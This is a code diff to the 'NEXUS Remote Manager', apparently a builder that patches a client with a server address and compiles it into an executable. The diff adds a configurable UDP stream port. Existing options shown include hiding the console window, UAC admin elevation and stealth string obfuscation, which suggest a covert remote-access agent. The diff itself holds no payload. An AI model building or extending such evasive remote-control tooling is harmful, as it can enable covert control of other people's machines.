@@ -11,6 +11,7 @@ CONFIG_FILE = "manager_config.json"
 DEFAULTS = {
     "server_ip": "127.0.0.1",
     "server_port": "8080",
+    "stream_port": "",
     "output_name": "agent",
     "console": False,
     "uac_admin": False,
@@ -140,8 +141,16 @@ class Manager:
             f'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "{self.config["server_port"]}")))',
             src,
         )
+        if self.config.get("stream_port"):
+            src = re.sub(
+                r'_STREAM_UDP_PORT = .+',
+                f'_STREAM_UDP_PORT = int(os.environ.get("STREAM_PORT", "{self.config["stream_port"]}"))',
+                src,
+            )
         Path("client.py").write_text(src, encoding="utf-8")
         print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
+        if self.config.get("stream_port"):
+            print(f"  [+] Stream UDP port -> {self.config['stream_port']}")
 
     def generate_spec(self, entry_point="client.py"):
         datas = []
@@ -393,6 +402,8 @@ class Manager:
             return
         self._kill_port(port)
         env = {**os.environ, "HOST": ip, "PORT": str(port)}
+        if self.config.get("stream_port"):
+            env["STREAM_PORT"] = str(self.config["stream_port"])
         p = subprocess.Popen(
             [sys.executable, "server.py"], env=env,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
@@ -438,7 +449,8 @@ class Manager:
         print("=== NEXUS Remote Manager ===\n")
         items = [
             ("1", "Server IP", c["server_ip"]),
-            ("2", "Server Port", c["server_port"]),
+            ("2", "Server Port (HTTP)", c["server_port"]),
+            ("P", "Stream UDP Port", c["stream_port"] or "(auto = HTTP+1000)"),
             ("3", "Output exe name", c["output_name"]),
             ("4", "Console window", "Yes" if c["console"] else "No"),
             ("5", "UAC Admin", "Yes" if c["uac_admin"] else "No"),
@@ -482,6 +494,9 @@ class Manager:
                 c["server_ip"] = self.edit("Server IP", c["server_ip"])
             elif ch == "2":
                 c["server_port"] = self.edit("Port", c["server_port"])
+            elif ch == "p":
+                v = input(f"  Stream UDP port [{c['stream_port'] or 'auto'}]: ").strip()
+                c["stream_port"] = v
             elif ch == "3":
                 c["output_name"] = self.edit("Output name", c["output_name"])
             elif ch == "4":
@@ -550,6 +565,7 @@ def main():
     parser.add_argument("--icon", help="Icon .ico file")
     parser.add_argument("--stealth", action="store_true", help="Enable string obfuscation")
     parser.add_argument("--no-stealth", action="store_true", help="Disable string obfuscation")
+    parser.add_argument("--stream-port", help="UDP stream port (default: HTTP port + 1000)")
     args = parser.parse_args()
 
     m = Manager()
@@ -557,6 +573,8 @@ def main():
         m.config["stealth"] = False
     if args.stealth:
         m.config["stealth"] = True
+    if args.stream_port:
+        m.config["stream_port"] = args.stream_port
     if args.build:
         if ":" in args.build:
             ip, port = args.build.split(":", 1)
